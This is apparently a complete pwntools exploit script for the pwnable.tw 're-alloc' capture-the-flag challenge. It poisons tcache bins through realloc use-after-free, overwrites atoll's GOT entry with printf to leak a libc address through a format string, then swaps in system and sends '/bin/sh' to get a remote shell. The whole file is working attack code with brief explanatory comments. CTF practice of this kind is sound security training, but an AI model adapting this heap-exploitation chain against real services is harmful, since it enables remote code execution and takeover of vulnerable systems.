from pwn import *

server = remote('chall.pwnable.tw', 10106)
elf = ELF('./re-alloc')
libc = ELF('./libc.so')

def alloc(index, size, data):
    server.sendlineafter('Your choice: ', '1')
    server.sendlineafter('Index:', str(index))
    server.sendlineafter('Size:', str(size))
    server.sendafter('Data:', data)

def realloc(index, size, data):
    server.sendlineafter('Your choice: ', '2')
    server.sendlineafter('Index:', str(index))
    server.sendlineafter('Size:', str(size))
    if size != 0:
        server.sendafter('Data:', data)

def free(index):
    server.sendlineafter('Your choice: ', '3')
    server.sendlineafter('Index:', str(index))

bss = elf.bss(0)
atoll_got = elf.got['atoll']
atoll_plt = elf.plt['atoll']
printf_plt = elf.plt['printf']
libc_start_main_ret_offset = libc.symbols['__libc_start_main'] + 0xeb
system_offset = libc.symbols['system']

# let tcache[0x20] => atoll_got
# heap[0] ==> chunk(0x18) <== heap[1]
alloc(0, 0x18, 'AAA')
realloc(0, 0, '')
realloc(0, 0x18, p64(atoll_got))
alloc(1, 0x18, 'BBB')

# now heap[0] == heap[1] == NULL
realloc(0, 0x38, 'CCC')
free(0)
realloc(1, 0x38, 'D' * 0x10)
free(1)

# let tcache[0x50] => atoll_got
# heap[0] ==> chunk(0x18) <== heap[1]
alloc(0, 0x48, 'AAA')
realloc(0, 0, '')
realloc(0, 0x48, p64(atoll_got))
alloc(1, 0x48, 'BBB')

# now heap[0] == heap[1] == NULL
realloc(0, 0x58, 'CCC')
free(0)
realloc(1, 0x58, 'D' * 0x10)
free(1)

# above all, we get two tcache point to atoll_got that can be malloc

# alloc once at heap[0]
# change the atoll_got to printf_plt
# use format string bug to leak the __libc_start_main_ret in the stack
alloc(0, 0x48, p64(printf_plt))
server.sendlineafter('Your choice: ', '3')
server.sendlineafter('Index:', '%21$llx')

libc_start_main_ret = int(server.recv(12), 16)
libc_base = libc_start_main_ret - libc_start_main_ret_offset
libc_system = libc_base + system_offset

# alloc twice at heap[1]
# since the atoll has been set to printf
# the return value of printf(which may be the length of the string) will be regarded as the "Index"
# thus we use length of the string to make "atoll" work
# then we change the atoll_got to libc_system
server.sendlineafter('Your choice: ', '1')
server.sendlineafter('Index:', 'A\x00')
server.sendafter('Size:', 'A' * 15 + '\x00')
server.sendafter('Data:', p64(libc_system))

# input "/bin/sh\x00" and call system(atoll) to get shell
server.sendlineafter('Your choice: ', '3')
server.sendlineafter('Index:', '/bin/sh\x00')

success('libc_start_main_ret: ' + hex(libc_start_main_ret))
success('libc_base: ' + hex(libc_base))
success('libc_system: ' + hex(libc_system))

server.interactive()